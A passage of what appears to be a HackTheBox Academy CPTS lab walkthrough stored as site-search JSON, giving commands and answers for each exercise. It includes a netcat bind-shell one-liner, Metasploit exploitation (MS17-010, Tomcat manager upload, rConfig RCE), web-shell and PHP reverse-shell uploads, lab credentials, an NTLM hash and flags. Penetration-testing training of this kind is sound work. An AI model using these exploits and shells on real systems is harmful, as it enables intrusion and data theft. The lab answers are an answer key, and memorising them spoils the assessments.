and find the username \"HTB\" and its password. Then, submit this user's password as the answer.</p> <pre><code>sudo nmap -sS -sV -top-ports 4000 $ip\n\n# We will attack firts service 2049\nshowmount -e $ip\nmkdir target-NFS\nsudo mount -t nfs $ip:/ ./target-NFS/ -o nolock\ncd target-NFS\n\nsudo ls -la\nsudo ls -la TechSupport\nsudo cat TechSupport/ticket4238791283782.txt\n</code></pre> <p>Credentials are obtained for accessing a different service:</p> <pre><code> 5    user=\"alex\"\n 6    password=\"lol123!mD\"\n</code></pre> <pre><code># Now we connect to 3389 RDP:\nxfreerdp /cert:ignore /u:alex /p:\"lol123\\!mD\" /v:$ip\n</code></pre> <p>A Windows connection opens up.</p> <p>We browse the machine and find <code>C:\\Users\\alex\\devshare\\important</code> file, that contains the following creds:</p> <pre><code>sa:87N1ns@slls83\n</code></pre> <p>Right click on Microsoft SQL Server Management Studio and select \"Execute as Administrator\". Enter the creds <code>87N1ns@slls83</code>. Now we connect to the server:</p> <p> </p> <p>Browse around, but the final SQL query would be</p> <pre><code>SELECT TOP (1000) [id]\n      ,[name]\n      ,[password]\n  FROM [accounts].[dbo].[devsacc]\n</code></pre> <p>Results: lnch7ehrdn43i7AoqVPK4zWR</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#footprinting-lab-hard","title":"Footprinting Lab - Hard","text":"<p>The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named\u00a0<code>HTB</code>\u00a0was also created here, whose credentials we need to access.</p> <p>Enumerate the server carefully and find the username \"HTB\" and its password. Then, submit HTB's password as the answer.</p> <pre><code># Enumerate TCP and UDP\nsudo nmap -sS -sV -top-ports 4000 $ip\nsudo nmap $ip -sU   \n</code></pre> <pre><code>PORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n110/tcp open  pop3     Dovecot pop3d\n143/tcp open  imap     Dovecot imapd (Ubuntu)\n993/tcp open  ssl/imap Dovecot imapd (Ubuntu)\n995/tcp open  ssl/pop3 Dovecot pop3d\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <pre><code>PORT    STATE         SERVICE\n68/udp  open|filtered dhcpc\n161/udp open          snmp\n</code></pre> <p>We start with SNMP vulnerabilities:</p> <pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip\n</code></pre> <p>In the result, you can spot the <code>community string</code> <code>backup</code>. Now, we can use braa:</p> <pre><code>braa backup@$ip:.1.3.6.* \n</code></pre> <p>In the results a credential is showed:</p> <pre><code>tom NMds732Js2761\n</code></pre> <p>We use that credential to login into the IMAP server:</p> <pre><code>openssl s_client -connect $ip:imaps\n\na LOGIN tom NMds732Js2761\n\na SELECT INBOX\na FETCH 1 all\na FETCH 1 BODY.PEEK[TEXT]\n</code></pre> <p>And we obtain a OPENSSH PRIVATE KEY that we save into our ~/.ssh folder. We give 600 permission to the file id_rsa.</p> <pre><code>chmod 600 id_rsa\nssh tom@$ip\n</code></pre> <p>Now, we are in. I had a look at the history file and saw a MySQL connection:</p> <pre><code>history\n</code></pre> <p>I decided to have a look at it:</p> <pre><code>mysql -u tom -p\n\n#Enter the password NMds732Js2761\n</code></pre> <pre><code>show databases;\nuse users;\nshow tables;\nselect * from users;\n</code></pre> <p>Results: cr3n4o7rzse7rzhnckhssncif7ds</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#information-gathering-web-edition","title":"Information Gathering - Web Edition","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#whois","title":"WHOIS","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#utilizing-whois","title":"Utilizing WHOIS","text":"<p>Perform a WHOIS lookup against the paypal.com domain. What is the registrar Internet Assigned Numbers Authority (IANA) ID number?</p> <pre><code>whoid paypal.com\n</code></pre> <p>Results: 292</p> <p>What is the admin email contact for the tesla.com domain (also in-scope for the Tesla bug bounty program)?</p> <pre><code>whoid tesla.com\n</code></pre> <p>Results: admin@dnstinations.com</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#dns-subdomains","title":"DNS &amp; Subdomains","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#digging-dns","title":"Digging DNS","text":"<p>Which IP address maps to inlanefreight.com?</p> <pre><code>dig +short inlanefreight.com\n</code></pre> <p>Results: 134.209.24.248</p> <p>Which domain is returned when querying the PTR record for 134.209.24.248?</p> <pre><code>dig -x 134.209.24.248 @1.1.1.1\n</code></pre> <p>Results:  inlanefreight.com</p> <p>What is the full domain returned when you query the mail records for facebook.com?</p> <pre><code>dig MX facebook.com\n</code></pre> <p>Results: smtpin.vvv.facebook.com</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#subdomain-bruteforcing","title":"Subdomain BruteForcing","text":"<p>Using the known subdomains for inlanefreight.com (www, ns1, ns2, ns3, blog, support, customer), find any missing subdomains by brute-forcing possible domain names. Provide your answer with the complete subdomain, e.g., www.inlanefreight.com.</p> <pre><code>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r\n</code></pre> <p>Results: my.inlanefreight.com</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#dns-zone-transfers","title":"DNS Zone Transfers","text":"<p>After performing a zone transfer for the domain inlanefreight.htb on the target system, how many DNS records are retrieved from the target system's name server? Provide your answer as an integer, e.g, 123.</p> <pre><code>dig axfr inlanefreight.htb @$ip \n</code></pre> <pre><code># Response\n; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr inlanefreight.htb @10.129.72.193\n;; global options: +cmd\ninlanefreight.htb.  604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\ninlanefreight.htb.  604800  IN  NS  ns.inlanefreight.htb.\nadmin.inlanefreight.htb. 604800 IN  A   10.10.34.2\nftp.admin.inlanefreight.htb. 604800 IN  A   10.10.34.2\ncareers.inlanefreight.htb. 604800 IN    A   10.10.34.50\ndc1.inlanefreight.htb.  604800  IN  A   10.10.34.16\ndc2.inlanefreight.htb.  604800  IN  A   10.10.34.11\ninternal.inlanefreight.htb. 604800 IN   A   127.0.0.1\nadmin.internal.inlanefreight.htb. 604800 IN A   10.10.1.11\nwsus.internal.inlanefreight.htb. 604800 IN A    10.10.1.240\nir.inlanefreight.htb.   604800  IN  A   10.10.45.5\ndev.ir.inlanefreight.htb. 604800 IN A   10.10.45.6\nns.inlanefreight.htb.   604800  IN  A   127.0.0.1\nresources.inlanefreight.htb. 604800 IN  A   10.10.34.100\nsecuremessaging.inlanefreight.htb. 604800 IN A  10.10.34.52\ntest1.inlanefreight.htb. 604800 IN  A   10.10.34.101\nus.inlanefreight.htb.   604800  IN  A   10.10.200.5\ncluster14.us.inlanefreight.htb. 604800 IN A 10.10.200.14\nmessagecenter.us.inlanefreight.htb. 604800 IN A 10.10.200.10\nww02.inlanefreight.htb. 604800  IN  A   10.10.34.112\nwww1.inlanefreight.htb. 604800  IN  A   10.10.34.111\ninlanefreight.htb.  604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800\n;; Query time: 540 msec\n;; SERVER: 10.129.72.193#53(10.129.72.193) (TCP)\n;; WHEN: Tue Sep 10 15:25:16 EDT 2024\n;; XFR size: 22 records (messages 1, bytes 594)\n</code></pre> <p>Results: 22</p> <p>Within the zone record transferred above, find the ip address for ftp.admin.inlanefreight.htb. Respond only with the IP address, eg 127.0.0.1</p> <p>Results:  10.10.34.2</p> <p>Within the same zone record, identify the largest IP address allocated within the 10.10.200 IP range. Respond with the full IP address, eg 10.10.200.1</p> <p>Results:  10.10.200.14</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#virtual-hosts","title":"Virtual Hosts","text":"<p>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with \"web\"? Answer using the full domain, e.g. \"x.inlanefreight.htb\"</p> <p>Important, the --append-domain part</p> <pre><code>gobuster vhost -u http://$domain:$port/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain\n</code></pre> <p>Results: web17611.inlanefreight.htb</p> <p>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with \"vm\"? Answer using the full domain, e.g. \"x.inlanefreight.htb\"</p> <p>Results: vm5.inlanefreight.htb</p> <p>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with \"br\"? Answer using the full domain, e.g. \"x.inlanefreight.htb\"</p> <p>Results: browser.inlanefreight.htb</p> <p>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with \"a\"? Answer using the full domain, e.g. \"x.inlanefreight.htb\"</p> <p>Results: admin.inlanefreight.htb</p> <p>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with \"su\"? Answer using the full domain, e.g. \"x.inlanefreight.htb\"</p> <p>Results: support.inlanefreight.htb</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#fingerprinting","title":"Fingerprinting","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#fingerprinting_1","title":"Fingerprinting","text":"<p>Determine the Apache version running on app.inlanefreight.local on the target system. (Format: 0.0.0)</p> <pre><code>sudo echo $ip app.inlanefreight.local &gt;&gt; /etc/hosts\ncurl -I app.inlanefreight.local\n</code></pre> <p>Results: 2.4.41B</p> <p>Which CMS is used on app.inlanefreight.local on the target system? Respond with the name only, e.g., WordPress.</p> <pre><code>whatweb http://app.inlanefreight.local\n</code></pre> <p>Results: Joomla</p> <p>On which operating system is the dev.inlanefreight.local webserver running in the target system? Respond with the name only, e.g., Debian.</p> <p>Results: Ubuntu </p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#crawling","title":"Crawling","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#creepy-crawlies","title":"Creepy crawlies","text":"<p>After spidering inlanefreight.com, identify the location where future reports will be stored. Respond with the full domain, e.g., files.inlanefreight.com.</p> <pre><code>python3 ReconSpider.py https://inlanefreight.com\n</code></pre> <p>Results: inlanefreight-comp133.s3.amazonaws.htb</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#web-archives","title":"Web Archives","text":"<p>How many Pen Testing Labs did HackTheBox have on the 8th August 2018? Answer with an integer, eg 1234.</p> <p>Go to https://web.archive.org/web/20180808080705/https://www.hackthebox.eu/</p> <p>Results: 74</p> <p>How many members did HackTheBox have on the 10th June 2017? Answer with an integer, eg 1234.</p> <p>Go to https://web.archive.org/web/20180808080705/https://www.hackthebox.eu/</p> <p>Results: 3054</p> <p>Going back to March 2002, what website did the facebook.com domain redirect too? Answer with the full domain, eg http://www.facebook.com/</p> <p>Go to https://web.archive.org/web/20020601000000*/www.facebook.com</p> <p>Results:  http://site.aboutface.com/</p> <p>According to the paypal.com website in October 1999, what could you use to \"beam money to anyone\"? Answer with the product name, eg My Device, remove the \u2122 from your answer.</p> <p>Go to https://web.archive.org/web/19991013140707/http://paypal.com/</p> <p>Results: Palm 0rganizer</p> <p>Going back to November 1998 on google.com, what address hosted the non-alpha \"Google Search Engine Prototype\" of Google? Answer with the full address, eg http://google.com</p> <p>Go to https://web.archive.org/web/19981111184551/http://google.com/</p> <p>Results: http://google.stanford.edu/</p> <p>Going back to March 2000 on www.iana.org, when exacty was the site last updated? Answer with the date in the footer, eg 11-March-99</p> <p>Go to https://web.archive.org/web/20000303211237/http://www.iana.org/</p> <p>Results: 17-December-99</p> <p>According to the wikipedia.com snapshot taken in March 2001, how many pages did they have over? Answer with the number they state without any commas, eg 2000 not 2,000</p> <p>Go to https://web.archive.org/web/20010331173908/http://www.wikipedia.com/</p> <p>Results: 3000</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#skills-assessment_1","title":"Skills Assessment","text":"<p>What is the IANA ID of the registrar of the inlanefreight.com domain?</p> <pre><code>whois inlanefreight.com\n</code></pre> <p>Results: 468</p> <p>What http server software is powering the inlanefreight.htb site on the target system? Respond with the name of the software, not the version, e.g., Apache.</p> <pre><code>curl -I $ip:$port\n</code></pre> <p>Results: nginx</p> <p>What is the API key in the hidden admin directory that you have discovered on the target system?</p> <pre><code># 1. Add $ip inlanefreight.htb to /etc/hosts\n\n# 2. Create variable $port\n\n# 3. Do a vhost scan. For instance\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.htb:$port -H \"HOST:FUZZ.inlanefreight.htb\" -fs 120\n\n# 4. Add the discovered VHOST to /etc/hosts\n\n# 5. Enumerate the site \ndirb http://web1337.inlanefreight.htb:$port\n\n# 6. There is a robots.txt file in the results, with a hiden admin panel. Trying to access directly the panel returns a 404. However we could try to fuzz it deeper:\nffuf -recursion -recursion-depth 1 -u http://web1337.inlanefreight.htb:53178/admin_h1dd3n/FUZZ -w /usr/share/seclists//Discovery/Web-Content/common.txt\n\n# 7. There is one result: index.html. Go to http://web1337.inlanefreight.htb:$port/admin_h1dd3n/index.html to retrieve the flag.\n</code></pre> <p>Results:  e963d863ee0e82ba7080fbf558ca0d3f</p> <p>After crawling the inlanefreight.htb domain on the target system, what is the email address you have found? Respond with the full email, e.g.,\u00a0mail@inlanefreight.htb.</p> <pre><code># 1. Following the previous question, additional vhost discovery could be done:\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.htb:$port -H \"HOST:FUZZ.web1337.inlanefreight.htb\" -fs 120\n# Add the second discovered VHOST (`dev`) to /etc/host, and visit the site http://dev.web1337.inlanefreight.htb/index.html. Notice that there is a next button, that takes you to a http://dev.web1337.inlanefreight.htb/index-123.html. Set-up an intruder attack with Numbered payload\n</code></pre> <p></p> <p></p> <p>Results:   1337testing@inlanefreight.htb</p> <p>What is the API key the inlanefreight.htb developers will be changing too?</p> <p></p> <p>Results: ba988b835be4aa97d068941dc852ff33</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#vulnerability-assessment","title":"Vulnerability Assessment","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#nesus","title":"Nesus","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#nessus-skills-assessment","title":"Nessus Skills assessment","text":"<p>What is the name of one of the accessible SMB shares from the authenticated Windows scan? (One word)</p> <p>Authenticate to port 22\u00a0\u00a0with user \"htb-student\" and password \"HTB_@cademy_student!\". Start nessus and go to the IP:8834 url. Have a look at the windows scan.</p> <p>Results: wsus</p> <p>What was the target for the authenticated scan? </p> <p>Results: 172.16.16.100</p> <p>What is the plugin ID of the highest criticality vulnerability for the Windows authenticated scan? </p> <p>Results: 156032</p> <p>What is the name of the vulnerability with plugin ID 26925 from the Windows authenticated scan? (Case sensitive)</p> <p>Results:   VNC Server Unauthenticated Access</p> <p>What port is the VNC server running on in the authenticated Windows scan?</p> <p>Results:  5900</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#openvass","title":"Openvass","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#openvass-skills-assessment","title":"Openvass Skills assessment","text":"<p>What type of operating system is the Linux host running? (one word)</p> <p>Results:  Ubuntu</p> <p>What type of FTP vulnerability is on the Linux host? (Case Sensitive, four words)</p> <p>Results:  Anonymous FTP Login Reporting</p> <p>What is the IP of the Linux host targeted for the scan?</p> <p>Results:  172.16.16.160</p> <p>What vulnerability is associated with the HTTP server? (Case-sensitive)</p> <p>Results:  Cleartext Transmission of Sensitive Information via HTTP</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#file-transfers","title":"File Transfers","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#windows-file-transfer-methods","title":"Windows File Transfer methods","text":"<p>Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.</p> <pre><code>curl http://$ip:80/flag.txt\n</code></pre> <p>Results:  b1a4ca918282fcd96004565521944a3b</p> <p>RDP to\u00a010.129.201.55\u00a0(ACADEMY-MISC-MS02)\u00a0with user \"htb-student\" and password \"HTB_@cademy_stdnt!\". Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run \"hasher upload_win.txt\" from the command line. Submit the generated hash as your answer.</p> <pre><code># First download the file to your kali. Second, run a server, for instance this PHP server\nsudo php -S 0.0.0.0:80\n\n# Launch a RDP connection\nxfreerdp /cert:ignore /u:$user /p:$pass /v:$ip\n\n# In the windows machine, open Powershell and retrieve the file:\n(New-Object Net.WebClient).DownloadFile('http://$ip/upload_win.zip','C:\\Users\\htb-student\\Desktop\\upload_win.zip')\n\n# Unzip it in the Desktop. Open cmd and run:\nhasher C:\\Users\\htb-student\\Desktop\\upload_win\\upload_win.txt\n</code></pre> <p>Results:  f458303ea783c224c6b4e7ef7f17eb9d</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#linux-file-transfer-methods","title":"Linux File Transfer methods","text":"<p>Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.</p> <pre><code>wget -O flag.txt http://$ip/flag.txt\n</code></pre> <p>Results:  5d21cf3da9c0ccb94f709e2559f3ea50</p> <p>SSH to\u00a010.129.206.169\u00a0(ACADEMY-MISC-NIX04)\u00a0with user \"htb-student\" and password \"HTB_@cademy_stdnt!\". Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run \"hasher <code>&lt;extracted file&gt;</code>\" from the command line. Submit the generated hash as your answer.</p> <pre><code>scp upload_nix.zip htb-student@$ip:/tmp\n# Enter the htb-student password\n\n# Unzip file\npython3 -m zipfile -e  upload_nix.zip .\n# Or\n\u00a0gunzip -S .zip upload_nix.zip\n\n# hash it\nhasher upload_nix.txt\n</code></pre> <p>Results:  159cfe5c65054bbadb2761cfa359c8b0</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#shells-payloads","title":"Shells &amp; Payloads","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#shell-basics","title":"Shell Basics","text":"<p>Which two shell languages did we experiment with in this section? (Format: shellname&amp;shellname)</p> <p>Results:  bash&amp;powershell</p> <p>In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer. Results:  Core</p> <p>Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?</p> <p>Results:  443</p> <p>SSH to\u00a0$ipVictim\u00a0with user \"htb-student\" and password \"HTB_@cademy_stdnt!\". Create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.</p> <pre><code># Connect via ssh with victim's machine. In the attacker machine:\nssh htb-student@$ipVictim\n# enter password. Now, in the same terminal set the listener:\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l $ipVictim $port &gt; /tmp/f\n\n# In the attacker terminal:\nnc $ipVictim $port\ncat /customscripts/flag.txt\n</code></pre> <p>Results:  B1nD_Shells_r_cool</p> <p>When establishing a reverse shell session with a target, will the target act as a client or server? Results:  Client</p> <p>Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.</p> <p>Results:  Shells-Win10</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#payloads","title":"Payloads","text":"<p>What command language interpreter is used to establish a system shell session with the target?</p> <p>Results:  powershell</p> <p>Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)</p> <pre><code>msfconsole -q\nuse exploit/windows/smb/psexec\nshow info\nset RHOSTS ...\nset LHOST ...\nset SMBPass HTB_@cademy_stdnt!  \nset SMBUser htb-student\nset SMBSHARE ADMIN$\nrun\n\ndir C:\\Users\\htb-student\\Documents&gt;\n</code></pre> <p>Results:  staffsalaries.txt</p> <p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#windows-shells","title":"Windows Shells","text":"<p>What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')</p> <p>Results:  .bat</p> <p>What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)</p> <p>Results:  MS17-010</p> <p>*Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:*</p> <pre><code>sudo nmap -sC -sV -O $ip -Pn\nmsfconsole -q\n\nsearch MS17-010\nuse windows/smb/ms17_010_psexec\nset RHOSTS...\nset SHARE ADMIN$\nset LHOST\nrun\n</code></pre> <p>Results:  EB-Still-W0rk$</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#nix-shells","title":"NIX Shells","text":"<p>What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?</p> <p>Results:  php</p> <p>Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.</p> <pre><code>sudo nmap -sC -sV -v $ip -Pn\n\n# Enter ip in the browser and discover rConfig Version 3.9.6 \n\nmsfconsole -q\nsearch rConfig\nuse linux/http/rconfig_vendors_auth_file_upload_rce\nset RHOSTS\nset LHOST\nrun\n\nls -la /devicedetails\ncat /devicedetails/hostnameinfo.txt\ncat /devicedetails/edgerouter-isp.yml\n</code></pre> <p>Results:  edgerouter-isp</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#web-shells","title":"Web Shells","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#laudanum","title":"laudanum","text":"<p>vHosts needed for these questions: <code>status.inlanefreight.local</code> Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\\path\\you\\land\\in)</p> <pre><code>sudo nmap -sC -sV $ip\n\n# Add \"$ip status.inlanefreight.local\" to /etc/hosts\n# browse to status.inlanefreight.local\n# Infer that aspx is in use.\n# Notice the upload file feature by the end of the page\n\n# Copy the file you want to use from laudanum repo to where you want to use it from:\ncp /usr/share/laudanum/aspx/shell.aspx /your/path/laudanum.aspx\n# In this case I'm selecting an aspx shell. There are other types.\n</code></pre> <p>Modify the shell to use. Add to the whitelisting rule your ip.</p> <p></p> <p>Upload the file to the web server.</p> <p>Once uploaded, go to http://status.inlanefreight.local//file/laudanum.aspx which is your uploaded file. You will see something like:</p> <p></p> <pre><code>dir\n</code></pre> <p>Results:  c:\\windows\\system32\\inetsrv</p> <p>Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)</p> <pre><code># Spawn Pwnbox and open a Parrot terminal\nlocate laudanum\n</code></pre> <p>Results:  /usr/share/laudanum/aspx/shell.aspx</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#antak-webshell","title":"antak webshell","text":"<p>vHosts needed for these questions: <code>status.inlanefreight.local</code>. Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)</p> <pre><code># Spawn Pwnbox and open a Parrot terminal\nlocate antak\n</code></pre> <p>Results:  /usr/share/nishang/Antak-WebShell/antak.aspx</p> <p>Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: *, 1 space)*</p> <pre><code># First step, generate the file you will upload:\nsudo cp /usr/share/nishang/Antak-WebShell/antak.aspx /path/Upload.aspx\n</code></pre> <p>Set credentials for access to the web shell. Modify\u00a0<code>line 14</code>, adding a user and password.</p> <p></p> <p>Open the browser and upload the file to the web app.  Open the url  //files/Upload.aspx and enter user and password.</p> <p></p> <p>Now that we have access, we can utilize PowerShell commands to navigate and take actions against the host.</p> <pre><code>whoami\n</code></pre> <p>Results:  iis apppool\\status</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#php-shells","title":"php shells","text":"<p>In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../...)</p> <p>Results:  image/gif</p> <p>Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)</p> <pre><code># Access the site and enter credentials admin:admin\n# Go to devices &gt; vendor \n# Intercept the uploading of the logo\n# Use https://www.revshells.com/ -&gt; PHP Ivan Sincek\n# Modifify the file to contain attacker ip and port\n# Upload it. Bypass content-type. Leave image/gif. Leave in the intercepted payload the PHP extensionin filename.\n# Set a netcat listener\nnc -lnvp 1234\n# Trigger the uploaded file from https://$ip/images/vendor/nameOfUploadedFile.php\n# You will get the reverse shell. List files\nls -la\n</code></pre> <p>Results:  ajax-loader.gif</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#skills-assessment_2","title":"Skills Assessment","text":"<p>CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your\u00a0<code>Pwnbox</code>, we will need to\u00a0<code>RDP</code>\u00a0into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.</p> <p>Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (<code>172.16.1.0/23</code>\u00a0network) so you may want to pay careful attention to the IP address you pick when starting your listeners.</p> <pre><code>xfreerdp /v:&lt;target IP&gt; /u:htb-student /p:HTB_@cademy_stdnt!\n</code></pre> <p>10.129.213.83</p> <p>What is the hostname of Host-1? (Format: all lower case)</p> <pre><code># Connect to the parrot machine\nxfreerdp /v:&lt;target IP&gt; /u:htb-student /p:HTB_@cademy_stdnt!\n\n# Open a terminal and scan ip range 172.16.1.0/23\nnmap 172.16.1.0/23\n\n# Three host identified: .11, .12, and .13. Host-1 is .11. Perform a nmap scan on open ports:\nsudo nmap -sC -sV 172.16.1.11 -p80,135,139,445,515,1801,2103,2105,2107,3389,8080\n\n# The hostname is displayed\n</code></pre> <p>Results:  SHELLS-WINSVR</p> <p>Exploit the target and gain a shell session. Submit the name of the folder located in C:\\Shares\\ (Format: all lower case)</p> <pre><code># The Parrot machine has on Desktop a file called access-creds.txt. It contains several useful creds, such as those of Tomcat service.\n# One of the services listed in the nmap scanner in Apache Tomcat 10.0.11 running on 8080. We will exploit that one:\nmsfconsole -q\nsearch tomcat\nuse multi/http/tomcat_mgr_upload\nset RHOSTS 172.16.1.11\nset RPORT 8080\nset target Windows Universal\nset payload payload/generic/shell_reverse_tcp \n# After gaining access, go to c:\\Shares\ndir\n</code></pre> <p>Results:   dev-share</p> <p>What distribution of Linux is running on Host-2? (Format: distro name, all lower case)</p> <pre><code>nmap -A 172.16.1.12 -p22,80\n</code></pre> <p>Results:  Ubuntu</p> <p>What language is the shell written in that gets uploaded when using the 50064.rb exploit?</p> <p>Results:  php</p> <p>Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt</p> <pre><code># Open firefox writting in the terminal\nfirefox\n\n# Open the blog in scope http://blog.inlinefreight.local and click on login\n# Enter the creds from the access-creds.txt file: admin:admin123!@#\n# The new interface allows you to upload certain contents. Open Burpsuite and intercept communications. Also, observe the content of the site. There is a link to https://www.exploit-db.com/exploits/50064 about Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)\n# Open a terminal on the Parrot:\nsearchsploit Lightweight\n# You will see \nLightweight facebook-styled blog 1.3 - Remote | php/webapps/50064.rb\n\n# Print the path\nsearchsploit -m php/webapps/50064.rb\n\n# Create the folders\nsudo mkdir /usr/share/metasploit-framework/modules/exploits/php/\nsudo mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/\n\n# Copy the exploit\nsudo cp 50064.rb mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/\n\n# Reload all modules\nreload_all\n\n# Now when searching for Lightweight, we could access the exploit\nsearch Lightweight\nuse exploit/php/webapps/50064\noptions\nset RHOSTS 172.16.1.12\nset TARGETURI /\nset VHOST blog.inlanefreight.local\nset USERNAME admin\nset PASSWORD admin123!@#\nrun\ncat /customscripts/flag.txt\n</code></pre> <p>Results:  B1nD_Shells_r_cool</p> <p>What is the hostname of Host-3?</p> <pre><code>sudo nmap -A 172.16.1.13 -p80,135,139,445\n</code></pre> <p>Results:  SHELLS-WINBLUE</p> <p>Exploit and gain a shell session with Host-3. Then submit the contents of C:\\Users\\Administrator\\Desktop\\Skills-flag.txt</p> <pre><code>msfconsole -q\nuse exploit/windows/smb/ms17_010_psexec\nSET RHOSTS 172.16.1.13\nSET LHOST 172.16.1.5\nrun \nshell\ntype C:\\Users\\Administrator\\Desktop\\Skills-flag.txt\n</code></pre> <p>Results:  One-H0st-Down!</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#using-the-metasploit-framework","title":"Using the Metasploit Framework","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#introduction-to-metasploit","title":"Introduction to Metasploit","text":"<p>Which version of Metasploit comes equipped with a GUI interface?</p> <p>Results: Metasploit Pro</p> <p>What command do you use to interact with the free version of Metasploit?</p> <p>Results: msfconsole</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#msf-components","title":"MSF Components","text":"<p>Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.</p> <pre><code>msfconsole -q\n\nsearch EternalRomance\nuse exploit/windows/smb/ms17_010_psexec\n\n#set options, run, and obtain a meterpreter\nshell\ntype C:/Users/Administrator/Desktop/flag.txt\n</code></pre> <p>Results: 